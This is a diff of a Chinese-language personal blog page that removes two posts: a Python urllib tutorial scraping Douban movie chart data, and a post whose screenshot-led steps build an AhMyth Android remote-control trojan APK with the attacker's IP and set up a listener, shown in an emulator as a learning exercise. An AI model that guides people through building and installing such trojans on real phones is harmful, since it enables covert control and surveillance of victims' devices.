urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)</span><br><span class="line">request = urllib.request.Request(url=url, data=data)</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line">content = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">data = json.loads(content)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204211536280.png" alt="image-20231204211536280"></p>
-<h3 id="aiax的get请求-豆瓣电影"><a href="#aiax的get请求-豆瓣电影" class="headerlink" title="aiax的get请求(豆瓣电影)"></a>aiax的get请求(豆瓣电影)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import urllib.request</span><br><span class="line">import re</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)</span><br><span class="line">url = &quot;https://movie.douban.com/chart&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line">#请求对象的定制</span><br><span class="line">request = urllib.request.Request(url, headers=headers)</span><br><span class="line">#获取响应的数据</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line">html = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">#print(html)</span><br><span class="line">#数据下载到本地</span><br><span class="line">fp = open(&#x27;douban.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">fp.write(html)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231206100322476.png" alt="image-20231206100322476"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231206100349435.png" alt="image-20231206100349435"></p>
-<h3 id="aiax的get请求-豆瓣电影全"><a href="#aiax的get请求-豆瓣电影全" class="headerlink" title="aiax的get请求(豆瓣电影全)"></a>aiax的get请求(豆瓣电影全)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">def create_request(page):</span><br><span class="line">    base_url = &quot;https://movie.douban.com/chart/top list?type=5&amp;interval id=100%3A90&amp;action=&amp;&quot;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;start&#x27;:(page-1) * 20,</span><br><span class="line">        &#x27;limit&#x27;:20</span><br><span class="line">    &#125;</span><br><span class="line">    data = urllib.parse.urlencode(data)</span><br><span class="line">    url = base_url + data</span><br><span class="line">#    print(url)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    #请求对象的定制</span><br><span class="line">    request = urllib.request.Request(url, headers=headers)</span><br><span class="line">    return request</span><br><span class="line"></span><br><span class="line">#获取响应的数据</span><br><span class="line">def get_content(request):</span><br><span class="line">    response = urllib.request.urlopen(request)</span><br><span class="line">    content = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">#下载</span><br><span class="line">def down_load(page,content):</span><br><span class="line">    with open(&#x27;douban_&#x27; + str(page) + &#x27;.jaon&#x27;,&#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">        fp.write(get_content(request))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#程序的入口</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    start_page = int(input(&#x27;请输入起始页码：&#x27;))</span><br><span class="line">    end_page = int(input(&#x27;请输入结束页码：&#x27;))</span><br><span class="line">    for page in range(start_page,end_page+1):</span><br><span class="line">        request = create_request(page)</span><br><span class="line">        content = get_content(request)</span><br><span class="line">        down_load(page,content)</span><br><span class="line">#        print(page)</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/04/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E7%88%AC%E8%99%AB/" data-id="clprnfur10002oku40f693f9q" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-cs模式和安卓远控" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/12/04/cs%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AE%89%E5%8D%93%E8%BF%9C%E6%8E%A7/" class="article-date">
-  <time class="post-time" datetime="2023-12-04T02:59:49.000Z" itemprop="datePublished">
-    <span class="post-month">12月</span><br/>
-    <span class="post-day">04</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/04/cs%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AE%89%E5%8D%93%E8%BF%9C%E6%8E%A7/">c/s模式和安卓远控</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="c-s模式"><a href="#c-s模式" class="headerlink" title="c&#x2F;s模式"></a>c&#x2F;s模式</h2><p>c是客户端，s是服务端</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204110320949.png" alt="image-20231204110320949"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204112238364.png" alt="image-20231204112238364"></p>
-<h2 id="安卓远控"><a href="#安卓远控" class="headerlink" title="安卓远控"></a>安卓远控</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204142906843.png" alt="image-20231204142906843"></p>
-<p>建议使用模拟器：mumu模拟器6</p>
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>打开安装AhMyth</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143047359.png" alt="image-20231204143047359"></p>
-<ul>
-<li>点击APK Builder，在Source IP中输入本机ip地址，再点击Build</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143239667.png" alt="image-20231204143239667"></p>
-<p>下方会生成一个地址存放下载的控制exe</p>
-<p>将其安装到模拟器中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143528214.png" alt="image-20231204143528214"></p>
-<p>双击打开，再点击Listen就会多一个控制台</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143912166.png" alt="image-20231204143912166"> </p>
-<p>点击左边的Open The Lab黑色部分。就可以进入控制器了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204144057441.png" alt="image-20231204144057441"></p>
-<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="ipv4"><a href="#ipv4" class="headerlink" title="ipv4"></a>ipv4</h3><p>第一类: 10.0.0.0-10.255.255.255;</p>
-<p>第二类: 172.16.0.0-172.31.255.255;</p>
-<p>第三类: 192.168.0.0-192.168.255.255;</p>
-<p>第四类: 100.64.0.0-100.127.255.255;</p>
-<p>这类通常用于运营商内部</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204163506472.png" alt="image-20231204163506472"></p>
-<p>​	    <strong>1）网络地址</strong></p>
-<p>　　IP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。</p>
-<p>　　<strong>2）广播地址</strong></p>
-<p>　　广播地址通常称为直接广播地址，是为了区分受限广播地址。</p>
-<p>　　广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1。当向某个网络的广播地址发送	    消息时，该网络内的所有主机都能收到该广播消息。</p>
-<p>　　<strong>3）组播地址</strong></p>
-<p>　　D类地址就是组播地址。</p>
-<p>　　先回忆下A，B，C，D类地址吧：</p>
-<p>　　A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255</p>
-<p>　　B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255;</p>
-<p>　　C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。</p>
-<p>　　D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通		信）；</p>
-<p>　　E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</p>
-<p>　　注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。</p>
-<p>　　<strong>4）255.255.255.255</strong></p>
-<p>　　该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限		广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可		在本地广播，也可跨网段广播。例如：主机192.168.1.1&#x2F;30上的直接广播数据包后，另外一个网段		192.168.1.5&#x2F;30也能收到该数据报；若发送受限广播数据报，则不能收到。</p>
-<p>　　注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广		播地址不能通过路由器。</p>
-<p>　　<strong>5）0.0.0.0</strong></p>
-<p>　　常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机		想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由		器屏蔽的范围内）的服务器发送IP请求分组。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204172637866.png" alt="image-20231204172637866"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/04/cs%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AE%89%E5%8D%93%E8%BF%9C%E6%8E%A7/" data-id="clptth8up0001u4u4chhle0ev" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&amp;laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">next &amp;raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">next &amp;raquo;</a>
   </nav>
 </section>
         
@@ -1052,7 +1074,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>38</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>43</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
